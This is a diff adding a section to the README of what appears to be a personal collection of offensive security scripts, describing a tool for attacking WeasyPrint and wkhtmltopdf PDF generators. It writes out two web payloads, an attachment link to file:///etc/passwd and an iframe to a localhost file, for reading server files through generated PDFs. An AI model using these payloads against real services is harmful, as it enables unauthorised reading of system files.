@@ -41,6 +41,12 @@ python redirector server for bypass ip filters maybe
 
 python redirector/redirector.py
 
+# WEASY
+python reader stream output for wesy generated pdf with a payload like <link rel="attachment" href="file:///etc/passwd" />
+but the wkhtml portion is bypased with <iframe src="http://localhost/local.txt" height=800px width=800px></iframe>
+
+python weasy/weasy.py
+
 ## KALI LINUX SCRIPTS
 
 ##--------------------------------
